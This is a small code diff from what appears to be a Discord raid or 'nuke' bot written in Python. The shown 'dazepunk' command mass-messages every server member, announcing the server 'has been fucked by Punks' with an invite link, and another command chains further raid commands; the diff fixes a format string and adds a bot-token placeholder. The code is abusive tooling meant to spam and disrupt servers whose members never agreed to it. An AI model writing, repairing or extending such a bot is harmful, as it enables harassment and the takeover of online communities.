@@ -132,7 +132,7 @@ async def dazepunk(ctx):
     for users in ctx.guild.members:
         if users != ctx.message.author: #The bot will not send you any DM with this command using this conditional.
             try:
-                await users.send(f"The server {} has been fucked by Punks:\nhttps://discord.gg/FhJydrmbTz")
+                await users.send(f"The server {ctx.guild.name} has been fucked by Punks:\nhttps://discord.gg/FhJydrmbTz")
             except:
                 print(f"Error, i can't send a message to the user {user}, maybe he locked the DM Access.")
 
@@ -142,4 +142,4 @@ async def millencolin(ctx): #There's some bugs in this command, sometimes, the b
     kaotiko(ctx)
     herejia(ctx)
 
-client.run("")
+client.run("") #Put your Bot Token here.
